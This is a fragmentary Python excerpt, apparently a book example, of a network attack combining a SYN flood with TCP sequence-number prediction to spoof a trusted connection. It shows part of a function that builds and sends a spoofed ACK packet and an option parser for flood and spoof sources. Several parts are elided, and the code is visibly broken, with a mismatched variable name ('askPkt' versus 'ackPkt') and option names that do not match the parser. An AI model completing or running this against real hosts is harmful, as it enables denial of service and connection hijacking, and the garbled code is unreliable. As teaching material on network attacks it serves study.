# Book example of using TCP sequence number prediction as part of an attack.
...
def spoofConn(src, tgt, ack):
  ...
  askPkt = IPlayer /TCPlayer
  send(ackPkt)

def main():
  parser = optparse.OptionParser('usage%prog -s <src for SYN flood> -S <src for spoofed connection> -t <target address>')
  parser.add_option('-s', dest='synSpoof',  type='string', help='specify source for SYN Flood')
  parser.add_option('-S', dest='srcSpoof',  type='string', help='specify source for spoofed connection')
  ...
  synFlood(options.src, options.dest)
